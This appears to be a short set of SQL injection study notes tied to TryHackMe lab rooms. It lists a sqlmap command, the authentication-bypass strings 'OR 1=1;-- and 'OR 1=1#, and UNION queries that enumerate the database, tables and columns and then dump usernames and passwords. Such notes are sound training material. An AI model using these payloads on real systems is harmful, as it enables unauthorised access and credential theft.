# SQL Injection
https://tryhackme.com/room/sqlinjectionlm

## SQLMap
https://tryhackme.com/room/sqlmap
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

## Auth Bypass
'OR 1=1;--
'OR 1=1#

## Union SQLi
Find database name
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()

Find table names
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dbname'

Find columns
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'tbname'

Get contents
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
